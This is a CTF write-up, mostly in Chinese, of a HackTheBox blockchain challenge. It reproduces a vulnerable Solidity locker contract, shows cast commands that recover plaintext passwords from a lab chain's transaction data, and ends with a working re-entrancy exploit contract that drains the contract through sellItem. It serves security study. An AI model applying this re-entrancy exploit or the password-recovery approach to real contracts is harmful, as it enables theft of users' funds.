---
title: HTB Blockchain Challenge - Locked and Loaded
date: {{ date }}
cover   : "/img/htb4.jpeg"
tags: Blockchain SmartContract Exploit
---


### Lockers.sol
* 先上程式
```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Lockers {
    enum Rarity {
        Common,
        Rare,
        Epic,
        Mythic
    }

    struct Item {
        string name;
        string owner;
        Rarity rarity;
    }

    mapping(string => string) private users;
    mapping(string => address) private usernameToWallet;
    mapping(Rarity => uint256) public price;
    Item[] private items;

    constructor(
        string[] memory _users,
        string[] memory _passwords,
        string[] memory _itemNames,
        string[] memory _itemOwners,
        uint8[] memory _itemRarities
    ) payable {
        require(_users.length == _passwords.length);
        require((_itemNames.length == _itemOwners.length) && (_itemOwners.length == _itemRarities.length));

        for (uint256 i; i < _users.length;) {
            users[_users[i]] = _passwords[i];
            unchecked {
                ++i;
            }
        }

        for (uint256 i; i < _itemNames.length;) {
            items.push(Item(_itemNames[i], _itemOwners[i], Rarity(_itemRarities[i])));
            unchecked {
                ++i;
            }
        }

        price[Rarity.Common] = 1;
        price[Rarity.Rare] = 10;
        price[Rarity.Epic] = 100;
        price[Rarity.Mythic] = 1000000000000000000;
    }

    function putItem(string calldata name, string calldata owner, uint8 rarity) external {
        require(rarity < 3);
        items.push(Item(name, owner, Rarity(rarity)));
    }

    function viewItems(string calldata _name) external view returns (string memory, Rarity) {
        for (uint256 i = 0; i < items.length; ++i) {
            if (_strEquals(_name, items[i].name)) {
                return (items[i].owner, items[i].rarity);
            }
        }
        revert("NoSuchItem");
    }

    function retrieveItem(string calldata name, string calldata password) external {
        for (uint256 i = 0; i < items.length; ++i) {
            if (_strEquals(name, items[i].name)) {
                require(_strEquals(password, users[items[i].owner]), "Authentication Failed");
                delete items[i];
                break;
            }
        }
    }

    function transferItem(string calldata name, string calldata to, string calldata password) external {
        for (uint256 i = 0; i < items.length; ++i) {
            if (_strEquals(name, items[i].name)) {
                require(_strEquals(password, users[items[i].owner]), "Authentication Failed");
                items[i].owner = to;
                break;
            }
        }
    }

    function sellItem(string calldata name, string calldata password) external {
        uint256 index;
        Item memory _item;
        string memory prevOwner;

        for (uint256 i = 0; i < items.length; ++i) {
            if (_strEquals(name, items[i].name)) {
                require(_strEquals(password, users[items[i].owner]), "Authentication Failed");
                _item = items[i];
                prevOwner = items[i].owner;
                index = i;
            }
        }

        require(bytes(_item.name).length > 0, "Item does not exist");

        _item.owner = "Vendor";

        (bool success,) = usernameToWallet[prevOwner].call{value: price[_item.rarity]}("");
        require(success);
        delete items[index];
    }

    function getLocker(string calldata username, string calldata password) external {
        require(bytes(users[username]).length == 0, "User already exists");
        require(!_strEquals(username, "Vendor"), "Only the true vendor can use this name!");
        users[username] = password;
        usernameToWallet[username] = msg.sender;
    }

    function _strEquals(string calldata _first, string memory _second) private pure returns (bool) {
        return keccak256(abi.encode(_first)) == keccak256(abi.encode(_second));
    }
}


```


### 分析
* 這題可以知道透過外部傳參的方式把資料傳進來
* 我們可以直接去找 tx 來取得當初設定的資料
* ` cast block --rpc-url http://188.166.175.58:32088/rpc 1`
* ` cast tx --rpc-url http://188.166.175.58:32088/rpc {tx_hash}`
* `cast call --rpc-url http://188.166.175.58:32088/rpc --private-key {{private key}} 0x5E0117F535D516a0DF81960890005AA012d43124 "viewItems(string)" "{Item.name}"`
* 工人智慧解析一下之後可以得到以下資訊



| Item.name | Item.rarity | Item.owner |
| -------- | -------- | -------- |
| PumkinFace | 2 | perfectlyremnant|
| RabbitArmor | 1| forestrepeat|
| StrangeCarrot | 1 | quizincomplete|
| BigBoots | 0 | mittensshade |
|BiometricScepter | 2 | callunthinking|
|CorruptedSword | 0 | perfectlyremnant|
|WizardsScepter | 3 | beliefspace|
|CommonDagger | 0 | dovesswimming|
|UncommonKaskol | 1 |fabulouspufferfish|
|BigBottle | 2 | writerafter|


* 目標是透過 WizardsScepter 觸發 Re-entrancy Attack兩次把前提光
* 代表我們要註冊beliefspace的wallet
* 又或者是想辦法新增一個user並轉移至自己身上
* 有 transferItem 這個function
* 因此思路就是
    * getLocker新增一個user指向合約
    * transferItem將Item.owner指向自己
    * 呼叫sell並且進入合約的Fallback function
    * 提款完成後退出
* 先找密碼
* 在TX input data 可以找到有一堆奇怪的東西
![image](https://hackmd.io/_uploads/r1EmULhO6.png)

* `(` 為 40
* 後面剛好緊接著40個字元
* 可以猜測這是密碼
    * 密碼跟帳號是有順序性的
    * 倒數第六個
    * yVEF3bka7UK5ho8#EYTuReCyaPO2CHr.0oVF5I8? 

### Exploit
```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Setup} from "./Setup.sol";
import {Lockers} from "./Lockers.sol";

contract Exploit{
    Setup setup;
    Lockers lockers;
    bool withdraw;
    constructor(Setup _setup){
        setup = _setup;
        lockers = setup.TARGET();
    }
    receive() external payable {
        if(!withdraw){
            withdraw = true;
            sell();
        }
    }
    function sell() public {
        lockers.sellItem("WizardsScepter", "XXX");
    }
    function transfer() public {
        lockers.transferItem("WizardsScepter", "prlab", "ss4#Nq7nNyKMfZ=XESnOzP2hk:SSRCzo2QPk4w~~");
    }
    function newLocker() public {
        lockers.getLocker("prlab", "XXX");
    }
    function exploit() public {
        newLocker();
        transfer();
        sell();
    }
}
```
